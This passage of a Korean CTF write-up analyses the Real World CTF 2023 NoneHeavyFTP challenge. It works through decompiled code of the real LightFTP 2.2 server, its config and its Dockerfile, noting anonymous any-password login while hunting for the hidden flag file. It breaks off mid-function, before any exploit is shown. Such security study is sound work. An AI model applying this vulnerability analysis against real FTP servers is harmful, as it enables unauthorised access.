---
title: "Real World CTF 2023 - NoneHeavyFTP"
# description: "realworld CTF 2023 NoneHeavy FTP"
dateString: January 2023
draft: false
tags: ["RealWorld CTF 2023","RealWorld CTF NoneheavyFTP"]
weight: 30
date: 2023-01-07
# cover:
    # image: ""
---
# NonHeavyFTP
![](/blog/RealWorld_CTF_2023_NoneHeavyFTP/image.png)
난이도가 Baby인거 보고 달려들었는데, 어려웠다.
## Analysis
```
[ftpconfig]
port=2121
maxusers=10000000
interface=0.0.0.0
local_mask=255.255.255.255

minport=30000
maxport=60000

goodbyemsg=Goodbye!
keepalive=1

[anonymous]
pswd=*
accs=readonly
root=/server/data/

```
ftp 서비스의 config 파일이다.
```
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND noninteractive

RUN apt-get update &&\
    apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid

RUN mkdir -p /server/data/ &&\
    echo "hello from LightFTP" >> /server/data/hello.txt &&\
    cd /server &&\
    wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip &&\
    unzip LightFTP-2.2.zip &&\
    cd LightFTP-2.2/Source/Release &&\
    make &&\
    cp -a ./fftp /server/ &&\
    cd /server &&\
    rm -rf LightFTP-2.2 LightFTP-2.2.zip

COPY ./flag /flag
COPY ./fftp.conf /server/fftp.conf

RUN mv /flag /flag.`uuid` &&\
    useradd -M -d /server/ -U ftp

WORKDIR /server

EXPOSE 2121

CMD ["runuser", "-u", "ftp", "-g", "ftp", "/server/fftp", "/server/fftp.conf"]
```
/flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있다.
flag 파일의 이름을 알아내야할 필요가 있다.

https://github.com/hfiref0x/LightFTP
그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다.
탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.

소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char *v4; // rbp
  __int64 v5; // rax
  char *v6; // r12
  int v7; // edi
  char *v8; // rax
  char *v9; // rax
  char *v10; // rax
  int v11; // ebx
  pthread_t v12[7]; // [rsp+0h] [rbp-38h] BYREF

  v12[1] = __readfsqword(0x28u);
  if ( argc <= 1 )
    v4 = (char *)config_init("fftp.conf", argv, envp);
  else
    v4 = (char *)config_init(argv[1], argv, envp);
  if ( !v4 )
  {
    __printf_chk(1LL, "Could not find configuration file\r\n\r\n Usage: fftp [CONFIGFILE]\r\n\r\n");
    if ( g_log != -1 )
      close(g_log);
LABEL_31:
    ftp_tls_cleanup();
    exit(2);
  }
  v5 = x_malloc(&_data_start);
  g_cfg = (__int64)v4;
  v6 = (char *)v5;
  in.s_addr = inet_addr("127.0.0.1");
  if ( (unsigned int)config_parse(v4, "ftpconfig", "interface", v6, (__int64)&_data_start) )
    in.s_addr = inet_addr(v6);
  stru_1011C.s_addr = inet_addr("0.0.0.0");
  if ( (unsigned int)config_parse(v4, "ftpconfig", "external_ip", v6, (__int64)&_data_start) )
    stru_1011C.s_addr = inet_addr(v6);
  stru_10120.s_addr = inet_addr("255.255.255.0");
  if ( (unsigned int)config_parse(v4, "ftpconfig", "local_mask", v6, (__int64)&_data_start) )
    stru_10120.s_addr = inet_addr(v6);
  word_10110 = 21;
  if ( (unsigned int)config_parse(v4, "ftpconfig", "port", v6, (__int64)&_data_start) )
    word_10110 = strtoul(v6, 0LL, 10);
  dword_10108 = 1;
  if ( (unsigned int)config_parse(v4, "ftpconfig", "maxusers", v6, (__int64)&_data_start) )
    dword_10108 = strtoul(v6, 0LL, 10);
  dword_1010C = 0;
  if ( (unsigned int)config_parse(v4, "ftpconfig", "keepalive", v6, (__int64)&_data_start) )
    dword_1010C = strtoul(v6, 0LL, 10);
  word_10112 = 1024;
  if ( (unsigned int)config_parse(v4, "ftpconfig", "minport", v6, (__int64)&_data_start) )
    word_10112 = strtoul(v6, 0LL, 10);
  word_10114 = -1;
  if ( (unsigned int)config_parse(v4, "ftpconfig", "maxport", v6, (__int64)&_data_start) )
    word_10114 = strtoul(v6, 0LL, 10);
  config_parse(v4, "ftpconfig", "CATrustFile", CAFILE, 4096LL);
  config_parse(v4, "ftpconfig", "ServerCertificate", CERTFILE, 4096LL);
  config_parse(v4, "ftpconfig", "Keyfile", KEYFILE, 4096LL);
  config_parse(v4, "ftpconfig", "KeyfilePassword", KEYFILE_PASS, 256LL);
  config_parse(v4, "ftpconfig", "goodbyemsg", GOODBYE_MSG, 128LL);
  memset(v6, 0, (size_t)&_data_start);
  if ( (unsigned int)config_parse(v4, "ftpconfig", "logfilepath", v6, (__int64)&_data_start) )
  {
    g_log = open64(v6, 66, 384LL);
    v7 = g_log;
    if ( g_log == -1 )
    {
      __printf_chk(1LL, "Error: Failed to open/create log file. Please check logfilepath: %s\r\n", v6);
      __printf_chk(
        1LL,
        "Possible errors: 1) path is invalid; 2) file is read only; 3) file is directory; 4) insufficient permissions\r\n");
LABEL_28:
      free(v4);
      if ( g_log != -1 )
        close(g_log);
      free(v6);
      goto LABEL_31;
    }
  }
  else
  {
    __printf_chk(1LL, "WARNING: logfilepath section is not found in configuration. Logging to file disabled.\r\n");
    v7 = g_log;
    if ( g_log == -1 )
    {
LABEL_22:
      __printf_chk(1LL, "\r\n    [ LightFTP server v%s ]\r\n\r\n", "2.2");
      __printf_chk(1LL, "Log file        : %s\r\n", v6);
      if ( getcwd(v6, (size_t)&_data_start) )
        __printf_chk(1LL, "Working dir     : %s\r\n", v6);
      if ( argc <= 1 )
        __printf_chk(1LL, "Config file     : %s/%s\r\n", v6, "fftp.conf");
      else
        __printf_chk(1LL, "Config file     : %s\r\n", argv[1]);
      v8 = inet_ntoa(in);
      __printf_chk(1LL, "Interface ipv4  : %s\r\n", v8);
      v9 = inet_ntoa(stru_10120);
      __printf_chk(1LL, "Interface mask  : %s\r\n", v9);
      v10 = inet_ntoa(stru_1011C);
      __printf_chk(1LL, "External ipv4   : %s\r\n", v10);
      __printf_chk(1LL, "Port            : %u\r\n", (unsigned __int16)word_10110);
      __printf_chk(1LL, "Max users       : %u\r\n", (unsigned int)dword_10108);
      __printf_chk(1LL, "PASV port range : %u..%u\r\n", (unsigned __int16)word_10112, (unsigned __int16)word_10114);
      __printf_chk(1LL, "\r\n TYPE q or Ctrl+C to terminate >\r\n");
      ftp_tls_init();
      v12[0] = 0LL;
      if ( pthread_create(v12, 0LL, ftpmain, 0LL) )
      {
        __printf_chk(1LL, "Error: Failed to create main server thread\r\n");
      }
      else
      {
        do
        {
          v11 = getc(stdin);
          sleep(1u);
        }
        while ( (v11 & 0xFFFFFFDF) != 'Q' );
      }
      goto LABEL_28;
    }
  }
  lseek64(v7, 0LL, 2);
  goto LABEL_22;
}
```
그냥 서버에서 화면? status? 띄워주는 함수다.
클라이언트랑은 상관없으니까 패스하고, ftpmain 함수부터 보면된다.

```c
void *__fastcall ftpmain(void *a1)
{
  int v1; // eax
  int v2; // r12d
  _DWORD *v3; // rbp
  unsigned int v4; // eax
  __int64 v5; // rdx
  int v6; // r15d
  int *v7; // r14
  int optval; // [rsp+10h] [rbp-68h] BYREF
  socklen_t addr_len; // [rsp+14h] [rbp-64h] BYREF
  pthread_t v11; // [rsp+18h] [rbp-60h] BYREF
  struct sockaddr addr; // [rsp+20h] [rbp-58h] BYREF
  unsigned __int64 v13; // [rsp+38h] [rbp-40h]

  v13 = __readfsqword(0x28u);
  v1 = socket(2, 1, 6);
  if ( v1 == -1 )
  {
    __printf_chk(1LL, "\r\n socket create error\r\n");
  }
  else
  {
    v2 = v1;
    optval = 1;
    setsockopt(v1, 1, 2, &optval, 4u);
    v3 = (_DWORD *)x_malloc(4LL * (unsigned int)dword_10108);
    if ( dword_10108 )
    {
      v4 = 0;
      do
      {
        v5 = v4++;
        v3[v5] = -1;
      }
      while ( dword_10108 > v4 );
    }
    addr.sa_family = 2;
    *(_QWORD *)&addr.sa_data[6] = 0LL;
    *(_WORD *)addr.sa_data = __ROL2__(word_10110, 8);
    *(struct in_addr *)&addr.sa_data[2] = in;
    if ( bind(v2, &addr, 0x10u) )
    {
      __printf_chk(1LL, "\r\n Failed to start server. Can not bind to address\r\n\r\n");
      free(v3);
      close(v2);
    }
    else
    {
      writelogentry(0LL, "220 LightFTP server ready\r\n", "");
      if ( !listen(v2, 4096) )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            do
            {
              addr_len = 16;
              addr = 0LL;
              v6 = accept(v2, &addr, &addr_len);
            }
            while ( v6 == -1 );
            optval = -1;
            if ( !dword_10108 )
              break;
            v7 = v3;
            while ( *v7 != -1 )
            {
              if ( ++v7 == &v3[dword_10108] )
                goto LABEL_16;
            }
            if ( dword_1010C )
              socket_set_keepalive(v6);
            *v7 = v6;
            optval = pthread_create(&v11, 0LL, ftp_client_thread, v7);
            if ( optval )
            {
              *v7 = -1;
              if ( optval )
                break;
            }
          }
LABEL_16:
          send(v6, "MAXIMUM ALLOWED USERS CONNECTED\r\n", 0x21uLL, 0x4000);
          close(v6);
        }
      }
      free(v3);
      close(v2);
    }
  }
  return 0LL;
}
```
마찬가지로 ftp_client_thread만 보면된다.
```c
// positive sp value has been detected, the output may be wrong!
void *__fastcall ftp_client_thread(int *a1)
{
  int v1; // edi
  __int64 v2; // rbp
  unsigned __int8 v4; // bl
  const unsigned __int16 **v5; // rax
  __int64 v6; // rdx
  const char *v7; // rbp
  __int64 v8; // rax
  size_t v9; // r13
  char *v10; // rax
  char *v11; // rdx
  const char **v12; // r12
  int v13; // ebx
  int v14; // ebp
  float v15; // xmm1_4
  double v16; // xmm1_8
  float v17; // xmm0_4
  int *v18; // [rsp-100h] [rbp-6130h]
  char *v19; // [rsp-F8h] [rbp-6128h]
  pthread_mutexattr_t *v20; // [rsp-F0h] [rbp-6120h]
  socklen_t v21; // [rsp-DCh] [rbp-610Ch] BYREF
  void *v22; // [rsp-D8h] [rbp-6108h] BYREF
  pthread_mutexattr_t v23; // [rsp-CCh] [rbp-60FCh] BYREF
  struct sockaddr v24; // [rsp-C8h] [rbp-60F8h] BYREF
  pthread_mutex_t mutex; // [rsp-B8h] [rbp-60E8h] BYREF
  int v26; // [rsp-90h] [rbp-60C0h]
  int v27; // [rsp-8Ch] [rbp-60BCh]
  pthread_t v28; // [rsp-88h] [rbp-60B8h]
  __int64 v29; // [rsp-80h] [rbp-60B0h]
  int v30; // [rsp-78h] [rbp-60A8h]
  int v31; // [rsp-74h] [rbp-60A4h]
  int v32; // [rsp-70h] [rbp-60A0h]
  __int16 v33; // [rsp-6Ch] [rbp-609Ch]
  int v34; // [rsp-68h] [rbp-6098h]
  int v35; // [rsp-64h] [rbp-6094h]
  unsigned __int32 v36; // [rsp-5Ch] [rbp-608Ch]
  char v37; // [rsp-40h] [rbp-6070h]
  char v38; // [rsp+0h] [rbp-6030h] BYREF
  __int64 v39; // [rsp+1000h] [rbp-5030h] BYREF
  __int64 v40; // [rsp+4FC0h] [rbp-1070h]
  __int64 v41; // [rsp+4FC8h] [rbp-1068h]
  __int64 v42; // [rsp+4FD0h] [rbp-1060h]
  size_t v43; // [rsp+4FD8h] [rbp-1058h]
  size_t v44; // [rsp+4FE0h] [rbp-1050h]
  __int64 instr_recved[521]; // [rsp+4FE8h] [rbp-1048h] BYREF

  while ( &v38 != (char *)(&v39 - 3072) )
    ;
  v18 = a1;
  instr_recved[513] = __readfsqword(0x28u);
  memset(&mutex, 0, 0x50A0uLL);
  v1 = *a1;
  v21 = 16;
  v26 = v1;
  v24 = 0LL;
  if ( !getsockname(v1, &v24, &v21) )
  {
    v21 = 16;
    v30 = *(_DWORD *)&v24.sa_data[2];
    v24 = 0LL;
    if ( !getpeername(v26, &v24, &v21) )
    {
      v35 = 0;
      v31 = *(_DWORD *)&v24.sa_data[2];
      v29 = 0xFFFFFFFFLL;
      v27 = -1;
      v36 = _InterlockedIncrement(&g_newid);
      v34 = -1;
      pthread_mutexattr_init(&v23);
      pthread_mutexattr_settype(&v23, 1);
      pthread_mutex_init(&mutex, &v23);
      v37 = 47;
      if ( v40 )
        ((void (__fastcall *)(__int64, const char *, __int64))gnutls_record_send)(
          v40,
          "220 LightFTP server ready\r\n",
          27LL);
      else
        send(v26, "220 LightFTP server ready\r\n", 0x1BuLL, 0x4000);
      memset(instr_recved, 0, 0x1000uLL);
      ((void (__fastcall *)(__int64 *, __int64, __int64, __int64, const char *, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))__snprintf_chk)(
        instr_recved,
        4096LL,
        1LL,
        4096LL,
        "<- New user IP=%u.%u.%u.%u:%u",
        (unsigned __int8)v24.sa_data[2],
        (unsigned __int8)v24.sa_data[3],
        (unsigned __int8)v24.sa_data[4],
        HIBYTE(*(_DWORD *)&v24.sa_data[2]),
        (unsigned __int16)__ROL2__(*(_WORD *)v24.sa_data, 8));
      writelogentry((__int64)&mutex, (__int64)instr_recved, (__int64)"");
      do
      {
LABEL_10:
        if ( v26 == -1 || !(unsigned int)recvcmd_part_0((__int64)&mutex, (char *)instr_recved, 0x1000LL) )// recvuntil \r\n
          break;
        v4 = instr_recved[0];
        if ( LOBYTE(instr_recved[0]) )
        {
          v5 = __ctype_b_loc();
          v6 = 0LL;
          while ( ((*v5)[(char)v4] & 0x400) == 0 )
          {
            ++v6;
            v4 = *((_BYTE *)instr_recved + v6);
            if ( !v4 )
            {
              v7 = (char *)instr_recved + v6;
              goto LABEL_41;
            }
          }
          v7 = (char *)instr_recved + v6;
          v8 = v6;
          if ( (v4 & 0xDF) != 0 )
          {
            do
            {
              ++v8;
              v4 = *((_BYTE *)instr_recved + v8);
            }
            while ( (v4 & 0xDF) != 0 );
            v9 = v8 - v6;
          }
          else
          {
            v9 = 0LL;
          }
          while ( v4 == ' ' )
          {
            ++v8;
            v4 = *((_BYTE *)instr_recved + v8);
          }
          v10 = (char *)instr_recved + v8;      // Second Arg?
          v11 = 0LL;
          if ( v4 )
            v11 = v10;
          v19 = v11;
        }
        else
        {
          v7 = (const char *)instr_recved;
LABEL_41:
          v19 = 0LL;
          v9 = 0LL;
        }
        v12 = (const char **)&ftpprocs;
        v13 = 0;
        while ( strncasecmp(v7, *v12, v9) )     // instruction parsing
        {
          ++v13;
          v12 += 2;
          if ( v13 == 0x20 )                    // instruction cnts -> 32
          {
            writelogentry((__int64)&mutex, (__int64)" @@ CMD: ", (__int64)instr_recved);
            if ( v40 )
              ((void (__fastcall *)(__int64, const char *, __int64))gnutls_record_send)(
                v40,
                "500 Syntax error, command unrecognized.\r\n",
                41LL);
            else
              send(v26, "500 Syntax error, command unrecognized.\r\n", 0x29uLL, 0x4000);
            goto LABEL_10;
          }
        }
        v14 = ((__int64 (__fastcall *)(pthread_mutex_t *, char *))(&ftpprocs)[2 * v13 + 1])(&mutex, v19);// CALL FTP USR
        if ( v13 == 0xD )
          writelogentry((__int64)&mutex, (__int64)" @@ CMD: ", (__int64)"PASS ***");
        else
          writelogentry((__int64)&mutex, (__int64)" @@ CMD: ", (__int64)instr_recved);
      }
      while ( v14 > 0 );
      v22 = 0LL;
      if ( !(_DWORD)v29 )
      {
        HIDWORD(v29) = 1;
        sleep(2u);
        if ( pthread_join(v28, &v22) )
        {
          writelogentry((__int64)&mutex, (__int64)"Enter cancel", (__int64)"");
          pthread_cancel(v28);
        }
        LODWORD(v29) = -1;
      }
      if ( v27 != -1 )
      {
        close(v27);
        v27 = -1;
      }
      if ( v34 != -1 )
      {
        close(v34);
        v34 = -1;
      }
      v32 = 0;
      v33 = 0;
      pthread_mutex_destroy(&mutex);
      pthread_mutexattr_destroy(v20);
      if ( v42 < 0 )
        v15 = (float)(v42 & 1 | (unsigned int)((unsigned __int64)v42 >> 1))
            + (float)(v42 & 1 | (unsigned int)((unsigned __int64)v42 >> 1));
      else
        v15 = (float)(int)v42;
      v16 = (float)(v15 * 0.00000095367432);
      if ( v41 < 0 )
        v17 = (float)(v41 & 1 | (unsigned int)((unsigned __int64)v41 >> 1))
            + (float)(v41 & 1 | (unsigned int)((unsigned __int64)v41 >> 1));
      else
        v17 = (float)(int)v41;
      ((void (*)(__int64 *, __int64, __int64, __int64, const char *, ...))__snprintf_chk)(
        instr_recved,
        4096LL,
        1LL,
        4096LL,
        " User disconnected. \n"
        "==== Session %u statistics ====\n"
        "Rx: %zd bytes (%f MBytes) total received by server in %zd files,\n"
        "Tx: %zd bytes (%f MBytes) total sent to the client in %zd files.\n",
        v36,
        v41,
        (float)(v17 * 0.00000095367432),
        v43,
        v42,
        v16,
        v44);
      writelogentry((__int64)&mutex, (__int64)instr_recved, (__int64)"");
    }
  }
  v2 = v40;
  if ( v40 )
  {
    ((void (__fastcall *)(__int64, _QWORD))gnutls_bye)(v40, 0LL);
    ((void (__fastcall *)(__int64))gnutls_deinit)(v2);
  }
  close(v26);
  *v18 = -1;
  return 0LL;
}
```
recvcmd_part_0 함수는 \r\n으로 끝나는 명령어가 오면, instruction operand로 잘 분리해서 저장해주고, 함수를 호출한다.
```
.data.rel.ro:000000000000F8E0 ftpprocs        dq offset aUser_0       ; DATA XREF: ftp_client_thread:loc_9A3E↑o
.data.rel.ro:000000000000F8E0                                         ; ftp_client_thread+326↑o
.data.rel.ro:000000000000F8E0                                         ; "USER"
.data.rel.ro:000000000000F8E8                 dq offset ftpUSER
.data.rel.ro:000000000000F8F0                 dq offset aQuit+1       ; "QUIT"
.data.rel.ro:000000000000F8F8                 dq offset ftpQUIT
.data.rel.ro:000000000000F900                 dq offset aNoop         ; "NOOP"
.data.rel.ro:000000000000F908                 dq offset ftpNOOP
.data.rel.ro:000000000000F910                 dq offset aPwd          ; "PWD"
.data.rel.ro:000000000000F918                 dq offset ftpPWD
.data.rel.ro:000000000000F920                 dq offset aType         ; "TYPE"
.data.rel.ro:000000000000F928                 dq offset ftpTYPE
.data.rel.ro:000000000000F930                 dq offset aPort_0       ; "PORT"
.data.rel.ro:000000000000F938                 dq offset ftpPORT
.data.rel.ro:000000000000F940                 dq offset aList+1       ; "LIST"
.data.rel.ro:000000000000F948                 dq offset ftpLIST
.data.rel.ro:000000000000F950                 dq offset aCdup+1       ; "CDUP"
.data.rel.ro:000000000000F958                 dq offset ftpCDUP
.data.rel.ro:000000000000F960                 dq offset aCwd_0        ; "CWD"
.data.rel.ro:000000000000F968                 dq offset ftpCWD
.data.rel.ro:000000000000F970                 dq offset aRetr_0       ; "RETR"
.data.rel.ro:000000000000F978                 dq offset ftpRETR
.data.rel.ro:000000000000F980                 dq offset aAbor         ; "ABOR"
.data.rel.ro:000000000000F988                 dq offset ftpABOR
.data.rel.ro:000000000000F990                 dq offset aDele_0       ; "DELE"
.data.rel.ro:000000000000F998                 dq offset ftpDELE
.data.rel.ro:000000000000F9A0                 dq offset aPasv         ; "PASV"
.data.rel.ro:000000000000F9A8                 dq offset ftpPASV
.data.rel.ro:000000000000F9B0                 dq offset aPass_0       ; "PASS"
.data.rel.ro:000000000000F9B8                 dq offset ftpPASS
.data.rel.ro:000000000000F9C0                 dq offset aRest         ; "REST"
.data.rel.ro:000000000000F9C8                 dq offset ftpREST
.data.rel.ro:000000000000F9D0                 dq offset aSize_0       ; "SIZE"
.data.rel.ro:000000000000F9D8                 dq offset ftpSIZE
.data.rel.ro:000000000000F9E0                 dq offset aMkd_0        ; "MKD"
.data.rel.ro:000000000000F9E8                 dq offset ftpMKD
.data.rel.ro:000000000000F9F0                 dq offset aRmd          ; "RMD"
.data.rel.ro:000000000000F9F8                 dq offset ftpRMD
.data.rel.ro:000000000000FA00                 dq offset aStor_0       ; "STOR"
.data.rel.ro:000000000000FA08                 dq offset ftpSTOR
.data.rel.ro:000000000000FA10                 dq offset aSyst         ; "SYST"
.data.rel.ro:000000000000FA18                 dq offset ftpSYST
.data.rel.ro:000000000000FA20                 dq offset aFeat         ; "FEAT"
.data.rel.ro:000000000000FA28                 dq offset ftpFEAT
.data.rel.ro:000000000000FA30                 dq offset aAppe_0       ; "APPE"
.data.rel.ro:000000000000FA38                 dq offset ftpAPPE
.data.rel.ro:000000000000FA40                 dq offset aRnfr_0       ; "RNFR"
.data.rel.ro:000000000000FA48                 dq offset ftpRNFR
.data.rel.ro:000000000000FA50                 dq offset aRnto_0       ; "RNTO"
.data.rel.ro:000000000000FA58                 dq offset ftpRNTO
.data.rel.ro:000000000000FA60                 dq offset aOpts         ; "OPTS"
.data.rel.ro:000000000000FA68                 dq offset ftpOPTS
.data.rel.ro:000000000000FA70                 dq offset aMlsd         ; "MLSD"
.data.rel.ro:000000000000FA78                 dq offset ftpMLSD
.data.rel.ro:000000000000FA80                 dq offset aAuth         ; "AUTH"
.data.rel.ro:000000000000FA88                 dq offset ftpAUTH
.data.rel.ro:000000000000FA90                 dq offset aPbsz         ; "PBSZ"
.data.rel.ro:000000000000FA98                 dq offset ftpPBSZ
.data.rel.ro:000000000000FAA0                 dq offset aProt         ; "PROT"
.data.rel.ro:000000000000FAA8                 dq offset ftpPROT
.data.rel.ro:000000000000FAB0                 dq offset aEpsv         ; "EPSV"
.data.rel.ro:000000000000FAB8                 dq offset ftpEPSV
.data.rel.ro:000000000000FAC0                 dq offset aHelp_0       ; "HELP"
.data.rel.ro:000000000000FAC8                 dq offset ftpHELP
.data.rel.ro:000000000000FAD0                 dq offset aSite         ; "SITE"
.data.rel.ro:000000000000FAD8                 dq offset ftpSITE
.data.rel.ro:000000000000FAD8 _data_rel_ro    ends
.data.rel.ro:000000000000FAD8
```
이런식으로 string과 함수 주소가 잘 매칭되어있다.

```c
_BOOL8 __fastcall ftpUSER(char *mutex, char *user_name)
{
  size_t v2; // rdx

  if ( user_name )
  {
    *((_DWORD *)mutex + 22) = 0;
    writelogentry((__int64)mutex, (__int64)" USER: ", (__int64)user_name);
    __snprintf_chk((__int64)(mutex + 0x3078), 0x2000LL, 1LL, 0x2000LL, "331 User %s OK. Password required\r\n");
    v2 = strlen(mutex + 0x3078);                // make string
    if ( *((_QWORD *)mutex + 0xA0F) )
      gnutls_record_send();
    else
      send(*((_DWORD *)mutex + 10), mutex + 0x3078, v2, 0x4000);
    __strcpy_chk(mutex + 0x3078, user_name, 0x2000uLL);
    return 1LL;
  }
  else if ( *((_QWORD *)mutex + 0xA0F) )
  {
    return gnutls_record_send() >= 0;
  }
  else
  {
    return send(*((_DWORD *)mutex + 10), "501 Syntax error in parameters or arguments.\r\n", 0x2EuLL, 0x4000) >= 0;
  }
}
```
ftpUSER 함수는 유저 이름 받는 함수이다.
이때 config_parse를 통해서 config 파일에서 그 유저에 대한 접근 권한, root path에 대한 정보를 받아온다.
그 이후 PASS로 비밀번호 인증하라고 한다.
```c
_BOOL8 __fastcall ftpPASS(__int64 a1, const char *password)
{
  int v2; // eax
  int v3; // r8d
  char v5[264]; // [rsp+0h] [rbp-138h] BYREF
  unsigned __int64 v6; // [rsp+108h] [rbp-30h]

  v6 = __readfsqword(0x28u);
  if ( !password )
  {
    if ( *(_QWORD *)(a1 + 0x5078) )
      return gnutls_record_send() >= 0;
    else
      return send(*(_DWORD *)(a1 + 40), "501 Syntax error in parameters or arguments.\r\n", 0x2EuLL, 0x4000) >= 0;
  }
  memset(v5, 0, 0x100uLL);
  if ( !(unsigned int)config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), "pswd", v5, (char *)&qword_100)// a, pswd, 
    || strcmp(v5, password) && v5[0] != '*' )
  {
    if ( *(_QWORD *)(a1 + 0x5078) )
      return gnutls_record_send() >= 0;
    return send(*(_DWORD *)(a1 + 40), "530 Invalid user name or password.\r\n", 0x24uLL, 0x4000) >= 0;
  }
  *(_QWORD *)(a1 + 0x1078) = 0LL;
  *(_QWORD *)(a1 + 0x2070) = 0LL;
  memset(
    (void *)((a1 + 0x1080) & 0xFFFFFFFFFFFFFFF8LL),
    0,
    8LL * (((_DWORD)a1 + 0x1078 - (((_DWORD)a1 + 0x1080) & 0xFFFFFFF8) + 4096) >> 3));
  memset(v5, 0, 0x100uLL);
  config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), "root", (_BYTE *)(a1 + 0x1078), "a");
  config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), "accs", v5, (char *)&qword_100);
  *(_DWORD *)(a1 + 88) = 0;
  if ( !strcasecmp(v5, "admin") )
  {
    v2 = 3;
LABEL_7:
    *(_DWORD *)(a1 + 0x58) = v2;
    writelogentry(a1, (__int64)" PASS->successful logon", (__int64)"");
    if ( *(_QWORD *)(a1 + 20600) )
      return gnutls_record_send() >= 0;
    return send(*(_DWORD *)(a1 + 40), "230 User logged in, proceed.\r\n", 0x1EuLL, 0x4000) >= 0;
  }
  if ( !strcasecmp(v5, "upload") )
  {
    v2 = 2;
    goto LABEL_7;
  }
  v3 = strcasecmp(v5, "readonly");
  v2 = 1;
  if ( !v3 )
    goto LABEL_7;
  if ( *(_QWORD *)(a1 + 0x5078) )
    return gnutls_record_send() >= 0;
  return send(*(_DWORD *)(a1 + 40), "530 This account is disabled.\r\n", 0x1FuLL, 0x4000) >= 0;
}
```
PASS 함수이다. 
config 파일에서 유저의 비밀번호를 찾고 인증한다.
\*면 어떤 비밀번호여도 체크가 패스된다.
아까 config 파일에서 있던 anonymous를 유저 이름으로 주고, 아무 비밀번호나 입력하면, ReadOnly 권한으로 ftp 서버에 접속할 수 있다.

이제 flag 이름을 읽기 위해서 ftp 명령어들을 구글링 해봤다.
MLSD가 나와서 그걸 분석해봤다.
```c
__int64 __fastcall ftpMLSD(pthread_mutex_t *mutex, char *a2)
{
  int owner; // edx
  int v4; // eax
  __int64 align; // rdi
  int v7; // eax
  pthread_t newthread; // [rsp+8h] [rbp-C0h] BYREF
  struct stat64 v9; // [rsp+10h] [rbp-B8h] BYREF
  unsigned __int64 v10; // [rsp+A8h] [rbp-20h]

  owner = mutex[2].__owner;
  v10 = __readfsqword(0x28u);
  if ( !owner )
  {
    if ( !mutex[515].__align )
      return send(mutex[1].__lock, "530 Please login with USER and PASS.\r\n", 0x26uLL, 0x4000) >= 0;
    return gnutls_record_send() >= 0;
  }
  if ( !mutex[1].__kind )
  {
    if ( !mutex[515].__align )
      return send(mutex[1].__lock, "550 Another action is in progress, use ABOR command first.\r\n", 0x3CuLL, 0x4000) >= 0;
    return gnutls_record_send() >= 0;
  }
  ftp_effective_path((__int64)(&mutex[105].__align + 2), (__int64)&mutex[3], a2, 0x2000uLL, &mutex[310].__size[8]);
  v4 = stat64(&mutex[310].__size[8], &v9);      // get stat of file
  align = mutex[515].__align;
  if ( !v4 && (v9.st_mode & 0xF000) == 0x4000 )
  {
    if ( align )
      gnutls_record_send();
    else
      send(mutex[1].__lock, "150 File status okay; about to open data connection.\r\n", 0x36uLL, 0x4000);
    writelogentry((__int64)mutex, (__int64)" MLSD-LIST ", (__int64)a2);
    mutex[1].__spins = 0;
    pthread_mutex_lock(mutex);
    v7 = pthread_create(&newthread, 0LL, (void *(*)(void *))mlsd_thread, mutex);
    mutex[1].__kind = v7;
    if ( v7 )
    {
      if ( mutex[515].__align )
        gnutls_record_send();
      else
        send(mutex[1].__lock, "451 Requested action aborted. Local error in processing.\r\n", 0x3AuLL, 0x4000);
    }
    else
    {
      *(&mutex[1].__align + 1) = newthread;
    }
    pthread_mutex_unlock(mutex);
    return 1LL;
  }
  else if ( align )
  {
    return gnutls_record_send() >= 0;
  }
  else
  {
    return send(mutex[1].__lock, "550 File or directory unavailable.\r\n", 0x24uLL, 0x4000) >= 0;
  }
}
```
mutex로 critical section을 하나의 쓰레드만 진입하도록 해준것 같다.
ftp_effective_path 함수로 경로를 얻어오고 stat으로 체크한다.
여기서 쓰레드로 mlsd_thread 함수를 호출한다. 첫번째 인자는 mutex 그대로 넘겨준다.
```c
void *__fastcall mlsd_thread(pthread_mutex_t *a1)
{
  int v1; // ebx
  DIR *v2; // rbp
  struct dirent64 *v3; // rcx
  __int64 align; // rdi
  pthread_mutex_t *v5; // rbx
  _BYTE fd[12]; // [rsp+14h] [rbp-94h] BYREF
  __pthread_unwind_buf_t buf; // [rsp+20h] [rbp-88h] BYREF

  buf.__pad[4] = (void *)__readfsqword(0x28u);
  pthread_mutex_lock(a1);
  if ( __sigsetjmp((struct __jmp_buf_tag *)&buf, 0) )
  {
    cleanup_handler(a1);
    __pthread_unwind_next(&buf);
  }
  v1 = 0;
  __pthread_register_cancel(&buf);
  *(_DWORD *)&fd[8] = 0;
  *(_QWORD *)fd = (unsigned int)create_datasocket(a1);
  if ( *(_DWORD *)fd != -1 )
  {
    if ( !a1[515].__align || (unsigned int)ftp_init_tls_session(&fd[4], *(unsigned int *)fd, 0) )
    {
      v2 = opendir(&a1[310].__size[8]);         // open dir
      if ( v2 )
      {
        do
        {
          v3 = readdir64(v2);
          if ( !v3 )
            break;
          v1 = mlsd_sub(&a1[310].__align + 1, *(unsigned int *)fd, *(_QWORD *)&fd[4], v3);
          if ( !v1 )
            break;
        }
        while ( !a1[1].__spins );
        closedir(v2);
      }
    }
    if ( *(_QWORD *)&fd[4] )
    {
      gnutls_bye(*(_QWORD *)&fd[4], 0LL);
      gnutls_deinit();
    }
  }
  writelogentry((__int64)a1, (__int64)" MLSD complete", (__int64)"");
  align = a1[515].__align;
  if ( *(_DWORD *)fd != -1 )
  {
    if ( !a1[1].__spins && v1 )
    {
      if ( !align )
      {
        send(a1[1].__lock, "226 Transfer complete. Closing data connection.\r\n", 0x31uLL, 0x4000);
        goto LABEL_18;
      }
    }
    else if ( !align )
    {
      send(a1[1].__lock, "426 Connection closed; transfer aborted.\r\n", 0x2AuLL, 0x4000);
      goto LABEL_18;
    }
    gnutls_record_send();
LABEL_18:
    close(*(int *)fd);
    a1[1].__count = -1;
    v5 = a1;
    goto LABEL_19;
